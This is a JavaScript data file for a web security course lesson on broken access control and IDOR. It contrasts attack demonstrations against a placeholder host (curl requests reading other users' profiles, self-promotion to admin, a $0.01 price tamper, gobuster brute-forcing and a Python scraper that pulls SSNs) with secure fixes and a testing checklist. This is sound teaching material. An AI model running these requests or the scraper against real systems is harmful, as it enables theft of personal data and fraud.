export const lesson = {
  id: 'L42',
  title: 'Broken Access Control & IDOR',
  slug: 'broken-access-control',
  type: 'PRACTICAL',
  duration: 45,
  xpReward: 35,
  difficulty: 'advanced',
  module: { title: 'Web Application Security', slug: 'web-security' },
  course: { title: 'Web Security Fundamentals', slug: 'web-security-fundamentals' },
  keyTerms: [
    'Access Control', 'IDOR', 'Horizontal Privilege Escalation',
    'Vertical Privilege Escalation', 'RBAC', 'ABAC',
    'Forced Browsing', 'Parameter Tampering', 'Authorization'
  ],
  content: [
    { type: 'heading', content: 'Broken Access Control & IDOR' },
    { type: 'paragraph', content: 'Broken Access Control is the #1 vulnerability in the OWASP Top 10 (2021). It occurs when users can access resources or perform actions beyond their intended permissions. IDOR (Insecure Direct Object Reference) is the most common form — changing an ID in a URL to access another user\'s data.' },


    { type: 'callout', variant: 'info', content: 'Analogy: Imagine a hotel where your room key card says "Room 205." Broken access control is like discovering that if you scratch off the "5" and write "6", the card works for Room 206 too. Or finding that the "Staff Only" door doesn\'t actually check if you\'re staff — anyone can walk through. The door exists, but nobody\'s checking.' },

    { type: 'heading', level: 2, content: 'IDOR: Insecure Direct Object Reference' },
    { type: 'paragraph', content: 'IDOR happens when an application uses predictable identifiers (sequential IDs, usernames) to access objects and doesn\'t verify that the requesting user owns that object.' },

    { type: 'heading', level: 3, content: 'Example 1: Viewing Other Users\' Data' },
    { type: 'command', command: 'curl -H "Cookie: session=user_john" "http://target.com/api/profile?user_id=123"', output: `{
  "id": 123,
  "name": "John Smith",
  "email": "john@company.com",
  "ssn": "123-45-6789",
  "salary": "$85,000"
}`, explanation: 'John views his own profile (user_id=123). Now let\'s try changing the ID...' },

    { type: 'command', command: 'curl -H "Cookie: session=user_john" "http://target.com/api/profile?user_id=124"', output: `{
  "id": 124,
  "name": "Sarah Johnson",
  "email": "sarah@company.com",
  "ssn": "987-65-4321",
  "salary": "$125,000"
}`, explanation: 'IDOR confirmed! John can access Sarah\'s profile (including SSN and salary) just by changing the user_id. The server doesn\'t check if user_id=124 belongs to the authenticated user. Horizontal privilege escalation.' },

    { type: 'heading', level: 3, content: 'Example 2: Downloading Other Users\' Files' },
    { type: 'command', command: 'curl -H "Cookie: session=user_john" "http://target.com/api/documents/download?doc_id=5001"', output: `Content-Disposition: attachment; filename="tax_return_2023.pdf"
Content-Type: application/pdf
[PDF binary data...]`, explanation: 'John downloads document ID 5001 which belongs to another user. The application stores documents with sequential IDs and never checks ownership. An attacker could write a script to download ALL documents (5001, 5002, 5003...).' },

    { type: 'command', command: 'cat idor_scraper.py', output: `import requests

session = requests.Session()
session.cookies.set('session', 'user_john')

# Enumerate all user profiles (IDOR exploitation)
for user_id in range(1, 10000):
    resp = session.get(f'http://target.com/api/profile?user_id={user_id}')
    if resp.status_code == 200:
        data = resp.json()
        print(f"ID:{user_id} | {data['name']} | {data['email']} | SSN:{data['ssn']}")

# Output: Entire user database extracted via IDOR`, explanation: 'A simple loop exploits IDOR to extract every user\'s data. This is exactly how many real-world data breaches happen — APIs that don\'t verify authorization on object access.' },

    { type: 'heading', level: 2, content: 'Vertical Privilege Escalation' },
    { type: 'paragraph', content: 'Accessing functionality meant for a higher-privileged role (user → admin):' },

    { type: 'command', command: 'curl -H "Cookie: session=regular_user" "http://target.com/admin/users"', output: `{
  "users": [
    {"id": 1, "name": "Admin", "role": "admin", "email": "admin@company.com"},
    {"id": 2, "name": "John", "role": "user", "email": "john@company.com"},
    ...
  ],
  "total": 4521
}`, explanation: 'A regular user accesses the admin endpoint directly. The application checks authentication (you must be logged in) but not authorization (are you an ADMIN?). This is the most dangerous form — it gives admin capabilities to any authenticated user.' },

    { type: 'command', command: 'curl -X POST -H "Cookie: session=regular_user" "http://target.com/admin/users/2/role" -d "role=admin"', output: `{"success": true, "message": "User role updated to admin"}`, explanation: 'Even worse — a regular user can PROMOTE themselves to admin by calling the role-change endpoint. No authorization check on who can change roles. Full admin access achieved.' },

    { type: 'heading', level: 3, content: 'Forced Browsing' },
    { type: 'paragraph', content: 'Accessing pages/endpoints that aren\'t linked in the UI but exist on the server:' },
    { type: 'list', items: [
      '/admin/dashboard — Hidden admin panel with no authorization check',
      '/api/v1/internal/debug — Debug endpoint with sensitive info',
      '/backup/database.sql.gz — Database backup accessible via URL',
      '/.env — Environment file with credentials',
      '/api/users (no auth) — Full user list accessible without login'
    ]},

    { type: 'command', command: 'gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt', output: `===============================================================
Gobuster v3.5
===============================================================
/admin                (Status: 200) [Size: 4523]
/api                  (Status: 200) [Size: 891]
/backup               (Status: 200) [Size: 15234567]
/config               (Status: 200) [Size: 2341]
/debug                (Status: 200) [Size: 8901]
/.env                 (Status: 200) [Size: 456]
/internal             (Status: 200) [Size: 12345]
===============================================================`, explanation: 'Directory brute-forcing reveals hidden endpoints. Status 200 means they\'re accessible without authentication. /backup and /.env are critical findings — likely contain credentials and database dumps.' },


    { type: 'heading', level: 2, content: 'Parameter Tampering' },
    { type: 'paragraph', content: 'Modifying parameters that the application trusts blindly:' },

    { type: 'command', command: 'curl -X POST "http://target.com/api/order" -d "item=laptop&price=999.99&quantity=1"', output: `{"order_id": 7891, "total": "$999.99", "status": "confirmed"}`, explanation: 'Normal order. But what if the price comes from the client?' },

    { type: 'command', command: 'curl -X POST "http://target.com/api/order" -d "item=laptop&price=0.01&quantity=1"', output: `{"order_id": 7892, "total": "$0.01", "status": "confirmed"}`, explanation: 'The application trusts the client-submitted price! A $999 laptop purchased for $0.01. The server should ALWAYS look up the price from the database, never trust client-submitted values for pricing, discounts, or quantities.' },

    { type: 'heading', level: 2, content: 'Fixing Broken Access Control' },

    { type: 'heading', level: 3, content: '1. Always Verify Ownership' },
    { type: 'command', command: 'cat secure_profile.js', output: `// SECURE: Verify the requested resource belongs to the authenticated user
app.get('/api/profile/:userId', authenticate, async (req, res) => {
  const requestedUserId = req.params.userId;
  const authenticatedUserId = req.user.id;  // From JWT/session
  
  // Authorization check: Can this user access this profile?
  if (requestedUserId !== authenticatedUserId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  const profile = await db.users.findById(requestedUserId);
  res.json(profile);
});`, explanation: 'The fix: After authentication, ALWAYS check if the authenticated user is authorized to access the requested resource. Admins can access any profile; regular users can only access their own.' },

    { type: 'heading', level: 3, content: '2. Use UUIDs Instead of Sequential IDs' },
    { type: 'list', items: [
      'Sequential IDs (1, 2, 3...) are trivially enumerable',
      'UUIDs (550e8400-e29b-41d4-a716-446655440000) are not guessable',
      'UUIDs don\'t prevent IDOR — you still need authorization checks',
      'But UUIDs prevent enumeration attacks (can\'t just increment)',
      'Best practice: UUIDs + authorization checks together'
    ]},

    { type: 'heading', level: 3, content: '3. Role-Based Access Control (RBAC)' },
    { type: 'command', command: 'cat rbac_middleware.js', output: `// Middleware that checks user role before allowing access
function requireRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

// Usage:
app.get('/admin/users', authenticate, requireRole('admin'), getUsers);
app.delete('/admin/users/:id', authenticate, requireRole('admin'), deleteUser);
app.get('/api/reports', authenticate, requireRole('admin', 'manager'), getReports);`, explanation: 'RBAC middleware enforces role requirements at the route level. Only admins can access /admin routes. Managers and admins can view reports. This is centralized, consistent, and hard to accidentally bypass.' },

    { type: 'heading', level: 3, content: '4. Deny by Default' },
    { type: 'list', items: [
      'Default: DENY all access unless explicitly granted',
      'Every endpoint must have explicit authorization rules',
      'If you forget to add a check, access is denied (fail-safe)',
      'Opposite of "allow by default" where forgetting a check = vulnerability',
      'Apply this principle at every layer: routes, controllers, database queries'
    ]},

    { type: 'heading', level: 2, content: 'Testing for Access Control Issues' },
    { type: 'list', items: [
      'Test with two accounts: Try accessing User A\'s resources as User B',
      'Test role boundaries: Try admin endpoints as a regular user',
      'Increment IDs: If /invoices/1001 is yours, try /invoices/1002',
      'Remove authorization headers: Does the endpoint still work without a token?',
      'Change HTTP method: If GET is protected, is PUT or DELETE also protected?',
      'Check API documentation: Are there undocumented endpoints?',
      'Use Burp Suite: Intercept and modify requests, changing IDs and roles'
    ]},

    { type: 'callout', variant: 'security', content: 'Access control bugs are the #1 vulnerability because they\'re hard to test automatically. SQL injection can be found by scanners, but "can user A see user B\'s data?" requires business logic understanding. Always test authorization manually with multiple user accounts.' },

    { type: 'heading', level: 2, content: 'Summary & Security Implications' },
    { type: 'list', items: [
      'Broken Access Control is OWASP #1 — more common than SQLi or XSS',
      'IDOR: Always verify that the authenticated user OWNS the requested resource',
      'Authorization != Authentication. Checking "is logged in" is not enough.',
      'Apply deny-by-default: Every endpoint needs explicit authorization rules',
      'Server-side enforcement only — never trust client-side role checks',
      'Use UUIDs to prevent enumeration, but still check authorization',
      'RBAC provides consistent, centralized permission management',
      'Test with multiple accounts at different privilege levels',
      'Never trust client-submitted values for pricing, roles, or permissions'
    ]},
  ],
  navigation: {
    prev: { title: 'Server-Side Request Forgery (SSRF) & Injection Attacks', slug: 'ssrf-injection' },
    next: { title: 'Security Misconfigurations & Vulnerable Components', slug: 'security-misconfigurations' },
  },
};
